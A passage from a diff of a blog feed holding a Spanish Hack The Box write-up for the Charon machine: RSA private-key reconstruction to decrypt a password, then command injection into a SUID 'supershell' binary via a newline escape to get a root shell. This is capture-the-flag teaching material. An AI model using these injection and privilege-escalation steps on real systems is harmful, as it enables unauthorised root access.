+        &lt;span class=&quot;n&quot;&gt;g&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;egcd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;g&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;//&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;modinv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;m&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;g&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;y&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;egcd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;m&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;g&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;raise&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Exception&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'modular inverse does not exist'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;m&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;d&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;modinv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;m&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;# Se muestran los valores
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;El valor de e = &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;El valor de n = &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;El valor de p = &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;El valor de q = &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;q&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;El valor de m = &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;m&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;El valor de d = &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;# Se genera la llave privada
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;priv_key&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;RSA&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;construct&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;q&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;La clave privada es:&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;priv_key&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;exportKey&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;utf-8&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;private.key&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;w&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;priv_key&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;exportKey&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;utf-8&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;# Se descifra el archivo pass.crypt
+&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;openssl rsautl -decrypt -inkey private.key -in pass.crypt -out pass.decrypted&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Tenemos ahora la contraseña &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nevermindthebollocks&lt;/code&gt;, la cual podría ser del usuario &lt;strong&gt;decoder&lt;/strong&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@charon:/home&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;su decoder
+Password: 
+decoder@charon:/home&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;whoami
+&lt;/span&gt;decoder
+decoder@charon:/home&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ya somos el usuario &lt;strong&gt;decoder&lt;/strong&gt; y podemos visualizar la flag (user.txt). Ahora nos falta convertirnos en usuario &lt;strong&gt;root&lt;/strong&gt;; por lo que vamos a enumerar un poco el sistema.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;decoder@charon:/home&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id
+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1001&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;decoder&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1001&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;freeeze&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1001&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;freeeze&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+decoder@charon:/home&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; password &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;decoder: 
+Sorry, user decoder may not run &lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;on charon.
+decoder@charon:/home&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /
+decoder@charon:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;find &lt;span class=&quot;se&quot;&gt;\-&lt;/span&gt;perm &lt;span class=&quot;nt&quot;&gt;-4000&lt;/span&gt; 2&amp;gt;/dev/null
+./usr/local/bin/supershell
+./usr/lib/openssh/ssh-keysign
+./usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+./usr/lib/dbus-1.0/dbus-daemon-launch-helper
+./usr/lib/snapd/snap-confine
+./usr/lib/policykit-1/polkit-agent-helper-1
+./usr/lib/eject/dmcrypt-get-device
+./usr/bin/pkexec
+./usr/bin/sudo
+./usr/bin/chfn
+./usr/bin/newgrp
+./usr/bin/gpasswd
+./usr/bin/chsh
+./usr/bin/passwd
+./usr/bin/at
+./usr/bin/newgidmap
+./usr/bin/newuidmap
+./bin/ntfs-3g
+./bin/ping6
+./bin/mount
+./bin/fusermount
+./bin/umount
+./bin/ping
+./bin/su
+decoder@charon:/&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Vemos un archivo curioso &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/local/bin/supershell&lt;/code&gt;, asi que vamos a echarle un ojo ya que tenemos permisos SUID.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;decoder@charon:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; /usr/local/bin/supershell
+&lt;span class=&quot;nt&quot;&gt;-rwsr-x---&lt;/span&gt; 1 root freeeze 9120 Jun 24  2017 /usr/local/bin/supershell
+decoder@charon:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;/usr/local/bin/supershell
+Supershell &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;very beta&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+usage: supershell &amp;lt;cmd&amp;gt;
+decoder@charon:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;/usr/local/bin/supershell &lt;span class=&quot;nb&quot;&gt;whoami
+&lt;/span&gt;Supershell &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;very beta&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+decoder@charon:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;strings /usr/local/bin/supershell             
+/lib64/ld-linux-x86-64.so.2
+tq&lt;span class=&quot;nv&quot;&gt;$t&lt;/span&gt;                       
+libc.so.6            
+setuid             
+&lt;span class=&quot;nb&quot;&gt;exit                
+&lt;/span&gt;strncmp             
+strncpy                       
+puts              
+__stack_chk_fail
+&lt;span class=&quot;nb&quot;&gt;printf
+&lt;/span&gt;strlen
+strcspn
+system
+__libc_start_main
+__gmon_start__
+GLIBC_2.4
+GLIBC_2.2.5
+%&lt;span class=&quot;s2&quot;&gt;&quot;       
+AWAVA
+AUATL
+[]A&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;]A^A_
+|&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&amp;amp;&amp;gt;&amp;lt;&lt;span class=&quot;s1&quot;&gt;'&quot;\[]{};#
+Supershell (very beta)
+usage: supershell &amp;lt;cmd&amp;gt;
+/bin/ls
+++[%s]
+;*3$&quot;
+GCC: (Ubuntu 5.4.0-6ubuntu1~16.04.4) 5.4.0 20160609
+crtstuff.c
+__JCR_LIST__
+deregister_tm_clones
+__do_global_dtors_aux
+completed.7585
+__do_global_dtors_aux_fini_array_entry
+frame_dummy
+__frame_dummy_init_array_entry
+__FRAME_END__
+__JCR_END__
+__init_array_end
+_DYNAMIC
+__init_array_start
+__GNU_EH_FRAME_HDR
+_GLOBAL_OFFSET_TABLE_
+__libc_csu_fini
+strncpy@@GLIBC_2.2.5
+strncmp@@GLIBC_2.2.5
+_ITM_deregisterTMCloneTable
+puts@@GLIBC_2.2.5
+_edata
+strlen@@GLIBC_2.2.5
+__stack_chk_fail@@GLIBC_2.4
+system@@GLIBC_2.2.5
+printf@@GLIBC_2.2.5
+tonto_chi_legge
+strcspn@@GLIBC_2.2.5
+__libc_start_main@@GLIBC_2.2.5
+__data_start
+__gmon_start__
+__dso_handle
+_IO_stdin_used
+__libc_csu_init
+__bss_start
+main
+_Jv_RegisterClasses
+exit@@GLIBC_2.2.5
+__TMC_END__
+_ITM_registerTMCloneTable
+setuid@@GLIBC_2.2.5
+.symtab
+.strtab
+.shstrtab
+.interp
+.note.ABI-tag
+.note.gnu.build-id
+.gnu.hash
+.dynsym
+.dynstr
+.gnu.version
+.gnu.version_r
+.rela.dyn
+.rela.plt
+.init
+.plt.got
+.text
+.fini
+.rodata
+.eh_frame_hdr
+.eh_frame
+.init_array
+.fini_array
+.jcr
+.dynamic
+.got.plt
+.data
+.bss
+.comment
+decoder@charon:/$
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;De las cadenas imprimibles del binario, ya debemos de ver que se hace uso de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin/ls&lt;/code&gt; de manera absoluta, es decir, no se hace el llamado a la función &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls&lt;/code&gt; tal cual, si no que se escribe de forma absoluta su ruta; así que vamos a tratar de ocuparla.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;decoder@charon:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;/usr/local/bin/supershell /bin/ls
+Supershell &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;very beta&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+++[/bin/ls]
+bin   dev  home        initrd.img.old  lib64    media  opt      root  sbin  srv  tmp  var      vmlinuz.old
+boot  etc  initrd.img  lib             lost+found  mnt    proc  run   snap  sys  usr  vmlinuz
+decoder@charon:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;
+decoder@charon:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;/usr/local/bin/supershell /bin/ls&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;whoami
+&lt;/span&gt;Supershell &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;very beta&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+++[/bin/ls]
+decoder.pub  pass.crypt  user.txt
+decoder
+decoder@charon:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;/usr/local/bin/supershell &lt;span class=&quot;s2&quot;&gt;&quot;/bin/ls;whoami&quot;&lt;/span&gt;
+Supershell &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;very beta&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+decoder@charon:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;/usr/local/bin/supershell &lt;span class=&quot;s2&quot;&gt;&quot;/bin/ls;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;whoami&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
+Supershell &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;very beta&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+decoder@charon:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;/usr/local/bin/supershell &lt;span class=&quot;s2&quot;&gt;&quot;/bin/ls&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;whoami&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
+Supershell &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;very beta&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+++[/bin/lsdecoder]
+sh: 1: /bin/lsdecoder: not found
+decoder@charon:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;/usr/local/bin/supershell &lt;span class=&quot;s2&quot;&gt;&quot;/bin/ls&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$/&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;
+&amp;gt; whoami
+&amp;gt; &quot;&lt;/span&gt;
+Supershell &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;very beta&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+++[/bin/ls&lt;span class=&quot;nv&quot;&gt;$/&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;whoami&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
+sh: 1: /bin/ls&lt;span class=&quot;nv&quot;&gt;$/&lt;/span&gt;: not found
+root
+decoder@charon:~&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Al realizar varias pruebas, ya encontramos una forma de ejecutar comandos como el usuario &lt;strong&gt;root&lt;/strong&gt; y lo logramos escapando del contexto con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$/ \n whoami \n &quot;&lt;/code&gt; y vemos &lt;strong&gt;root&lt;/strong&gt;. Por lo tanto, ahora vamos a lanzarnos una &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bash&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;decoder@charon:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;/usr/local/bin/supershell &lt;span class=&quot;s2&quot;&gt;&quot;/bin/ls&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$/&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;
+&amp;gt; bash
+&amp;gt; &quot;&lt;/span&gt;
+Supershell &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;very beta&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+++[/bin/ls&lt;span class=&quot;nv&quot;&gt;$/&lt;/span&gt;
+bash
+&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
+sh: 1: /bin/ls&lt;span class=&quot;nv&quot;&gt;$/&lt;/span&gt;: not found
+root@charon:~# &lt;span class=&quot;nb&quot;&gt;whoami
+&lt;/span&gt;root
+root@charon:~#
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ya somos el usuario &lt;strong&gt;root&lt;/strong&gt; y podemos visualizar la flag (root.txt).&lt;/p&gt;</content><author><name>K4miyo</name></author><category term="PHP" /><category term="SQL" /><category term="SQLi" /><category term="Injection" /><category term="Web" /><summary type="html">Resolución de la máquina Charon en la plataforma de Hack The Box</summary></entry><entry><title type="html">Hack The Box Obscurity</title><link href="http://localhost:4000/htb-obscurity/" rel="alternate" type="text/html" title="Hack The Box Obscurity" /><published>2022-01-09T00:00:00-06:00</published><updated>2022-01-09T00:00:00-06:00</updated><id>http://localhost:4000/htb-obscurity</id><content type="html" xml:base="http://localhost:4000/htb-obscurity/">&lt;p&gt;&lt;img src=&quot;/assets/images/htb-obscurity/banner-obscurity.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
 &lt;h2 id=&quot;obscurity&quot;&gt;Obscurity&lt;/h2&gt;
 &lt;p&gt;Se procede con la fase de reconocimiento lanzando primeramente un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ping&lt;/code&gt; a la dirección IP 10.10.10.168.&lt;/p&gt;
@@ -4916,355 +5698,4 @@ root
 # 
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;Ya somos el usuario &lt;strong&gt;root&lt;/strong&gt; y podemos visualizar la flag (root.txt).&lt;/p&gt;</content><author><name>K4miyo</name></author><category term="LFI" /><category term="DNS_Zone_Transfer" /><category term="File_Misconfiguration" /><category term="Web" /><summary type="html">Resolución de la máquina FriendZone en la plataforma de Hack The Box</summary></entry><entry><title type="html">Hack The Box Active</title><link href="http://localhost:4000/htb-active/" rel="alternate" type="text/html" title="Hack The Box Active" /><published>2021-12-05T00:00:00-06:00</published><updated>2021-12-05T00:00:00-06:00</updated><id>http://localhost:4000/htb-active</id><content type="html" xml:base="http://localhost:4000/htb-active/">&lt;p&gt;&lt;img src=&quot;/assets/images/htb-active/banner-active.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;active&quot;&gt;Active&lt;/h2&gt;
-&lt;p&gt;Se procede con la fase de reconocimiento lanzando primeramente un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ping&lt;/code&gt; a la dirección IP 10.10.10.100.&lt;/p&gt;
-
